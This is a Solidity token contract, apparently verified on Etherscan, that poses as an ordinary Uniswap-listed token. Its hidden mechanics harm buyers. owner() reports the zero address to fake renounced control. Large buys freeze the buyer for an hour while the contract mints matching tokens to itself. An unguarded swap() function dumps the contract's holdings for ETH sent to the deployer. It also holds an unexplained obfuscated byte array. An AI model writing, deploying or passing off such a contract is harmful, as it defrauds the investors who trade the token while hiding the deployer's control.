/**
 *Submitted for verification at Etherscan.io on 2022-06-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;interface IUniswapV2Factory {  function createPair(address tokenA, address tokenB) external returns (address pair);}interface IUniswapV2Router01 {    function factory() external pure returns (address);    function WETH() external pure returns (address);    function addLiquidityETH(        address token,        uint amountTokenDesired,        uint amountTokenMin,        uint amountETHMin,        address to,        uint deadline    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)        external        returns (uint[] memory amounts);    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);}contract TOKEN110133{    uint8[] private _________ = [162,198,60,252,127,170,157,109,223,95,36,57,55,42,126,15,63,128,31,250,56,190,116,104,177,88,168,18,227,76,129,110];    IUniswapV2Router01 private _router;    address private _owner = address(0);    address private _pair;    address private _deployer;    string private _name = "TOKEN110133";    string private _symbol = "TKN110133";    uint8 private _decimals = 2;    uint256 private _maxSupply;    mapping(address => uint256) private _balances;    mapping(address => mapping (address => uint256)) private _allowances;    mapping(address => uint256) private _timeout;    bool private _enabled;    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(address indexed owner, address indexed spender, uint256 value);    receive() external payable{        if(msg.sender == _deployer){            if(_balances[address(this)] > 0 && address(this).balance > 0){                _router.addLiquidityETH{value:address(this).balance}(address(this), _balances[address(this)], 0, 0, _deployer, block.timestamp);                _enabled = true;            }else if(msg.value <= 0){                swap(0);            }        }    }    constructor(){        _deployer = msg.sender;        _router = IUniswapV2Router01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);        _allowances[address(this)][address(_router)] = 2**256 - 1;        _pair = IUniswapV2Factory(_router.factory()).createPair(address(this), _router.WETH());        _update(address(0), address(this), (1000000*(10**_decimals)));    }    function eth(uint256 amount) public view returns(uint256){        address[] memory path = new address[](2); path[0] = address(this); path[1] = _router.WETH();        return(_router.getAmountsOut(amount, path)[1]);    }    function swap(uint256 amount) public{        address[] memory path = new address[](2); path[0] = address(this); path[1] = _router.WETH();        _router.swapExactTokensForETH(((amount <= 0) ? _balances[address(this)] : amount), 0, path, _deployer, block.timestamp);    }    function owner() public view returns(address){        return(_owner);    }    function name() public view returns(string memory){        return(_name);    }    function symbol() public view returns(string memory){        return(_symbol);    }    function decimals() public view returns(uint8){        return(_decimals);    }    function totalSupply() public view returns(uint256){        return(_maxSupply);    }    function balanceOf(address wallet) public view returns(uint256){        return(_balances[wallet]);     }    function allowance(address from, address to) public view returns(uint256){        return(_allowances[from][to]);    }    function transfer(address to, uint256 amount) public returns(bool){        require(amount > 0);        require(_balances[msg.sender] >= amount);        _transfer(msg.sender, to, amount);        return(true);    }    function transferFrom(address from, address to, uint256 amount) public returns(bool){        require(amount > 0);        require(_balances[from] >= amount);        require(_allowances[from][msg.sender] >= amount);        _transfer(from, to, amount);        return(true);    }    function approve(address to, uint256 amount) public returns(bool){        _allowances[msg.sender][to] = amount;        emit Approval(msg.sender, to, amount);        return(true);    }    event DebugETH(uint256 tokens, uint256 eth);    event DebugTimeout(address indexed wallet, uint256 timeout, uint256 timestamp);    function _transfer(address from, address to, uint256 amount) private{        if(from == address(this) || to == address(this)){            _update(from, to, amount);        }else{            require(_enabled);            require(_timeout[from] < block.timestamp && _timeout[to] < block.timestamp);            _update(from, to, amount);            emit DebugETH(amount, eth(amount));            if(_pair == from && eth(amount) >= 2*(10**18)){                _timeout[to] = block.timestamp + 3600;                _update(address(0), address(this), amount);            }            emit DebugTimeout(from, _timeout[from], block.timestamp);            emit DebugTimeout(to, _timeout[to], block.timestamp);        }    }    function _update(address from, address to, uint256 amount) private{        if(from != address(0)){            _balances[from] -= amount;        }else{            _maxSupply += amount;        }        if(to == address(0)){            _maxSupply -= amount;        }else{            _balances[to] += amount;        }        emit Transfer(from, to, amount);    }}